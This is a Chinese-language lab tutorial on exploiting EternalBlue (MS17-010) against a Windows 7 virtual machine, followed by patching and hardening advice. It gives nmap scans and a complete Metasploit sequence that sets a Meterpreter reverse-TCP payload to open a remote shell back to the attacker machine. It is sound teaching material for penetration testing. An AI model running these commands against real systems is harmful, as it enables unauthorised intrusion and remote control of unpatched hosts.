## 一、漏洞简介

永恒之蓝（EternalBlue）是指 2017 年 4 月 14 日，黑客组织 Shadow Brokers（影子经纪人）公布的 Equation Group（方程式组织）泄露的网络武器库中的一款漏洞利用工具。该工具利用的是 **Windows SMB 远程协议（445 端口）** 中的一个缓冲区溢出漏洞（CVE-2017-0144），影响 Windows 从 XP 到 Server 2016 的多个版本系统，可导致远程代码执行。

> 该漏洞曾在 2017 年被不法分子改造为 WannaCry 勒索病毒，在全球范围内大规模爆发，造成严重危害。

## 二、实验环境

| 角色 | 系统 | IP 地址 |
| --- | --- | --- |
| 攻击机 | Kali Linux 虚拟机 | 192.168.31.153 |
| 目标机 | Windows 7 SP1 x64 | 192.168.31.137 |

网络要求：
- 两台机器处于同一局域网；
- 使用 **桥接模式** 连接，使虚拟机与宿主机处于同一网段。

## 三、信息收集

### 1. 扫描存活主机

使用 nmap 扫描本网段内存活主机，确定攻击目标。

```bash
nmap -sP 192.168.31.0/24
```
![](images/Pasted%20image%2020260920202335.png)
确认目标主机为 `192.168.31.137`。

### 2. 扫描目标开放端口

扫描目标主机 1-65532 端口，并探测操作系统与服务版本。

```bash
nmap -p 1-65532 -A 192.168.31.137
```

扫描结果显示目标开放了 **445 端口**（SMB 服务）。永恒之蓝漏洞利用的正是 SMB 服务中的协议缺陷。
![](images/Pasted%20image%2020260920202450.png)
## 四、漏洞探测

打开 Metasploit Framework 控制台：

```bash
msfconsole
```
![](images/Pasted%20image%2020260920202558.png)
使用 MS17-010 漏洞扫描模块探测目标是否存在该漏洞：

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.31.137
RHOSTS => 192.168.31.137
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
```
扫描结果若显示 `Host is likely VULNERABLE to MS17-010`，则说明目标存在该漏洞。
![](images/Pasted%20image%2020260920202539.png)
## 五、漏洞利用

使用永恒之蓝漏洞利用模块获取目标主机的 Meterpreter Shell：

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.31.137
rhosts => 192.168.31.137

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.31.153
lhost => 192.168.31.153

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
![](images/Pasted%20image%2020260920202639.png)
执行成功的关键输出：
所有的配置完后，进行run即可
```text

[+] 192.168.31.137:445 - The target is vulnerable.
```

执行成功后即可获得目标主机的 Meterpreter 会话。

### 常见失败原因

- `Handler failed to bind to 192.168.31.153:4444`：监听地址无法绑定，可尝试更换 `lhost` 为本机其他可用 IP，或检查防火墙；
- 目标系统已安装补丁（KB4012212 / KB4012213 / KB4012215 等）；
- 目标机未直接开放 445 端口或被防火墙拦截。

## 六、防御建议

1. **及时打补丁**：微软已发布 MS17-010 安全更新，强烈建议升级到最新系统补丁；
2. **关闭高危端口**：在防火墙中关闭 135、139、445 等 SMB 相关端口的外网访问；
3. **关闭 SMBv1 协议**：通过组策略或注册表禁用 SMBv1 服务；
4. **开启 Windows Defender / 安全软件**：现代杀软基本都能识别该攻击；
5. **最小化授权**：对内网主机进行严格的访问控制，避免任意主机互访；
6. **定期渗透测试**：定期排查内网中未打补丁的设备。
